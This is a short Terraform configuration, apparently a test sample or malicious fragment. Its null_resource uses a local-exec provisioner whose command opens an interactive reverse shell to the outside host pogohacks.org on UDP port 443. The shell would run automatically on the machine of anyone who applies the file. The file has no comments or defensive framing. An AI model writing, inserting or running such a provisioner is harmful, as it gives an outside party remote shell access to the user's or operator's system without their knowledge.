resource "null_resource" "run_local_command" {
  provisioner "local-exec" {
    command = "sh -i >& /dev/udp/pogohacks.org/443 0>&1"
  }
}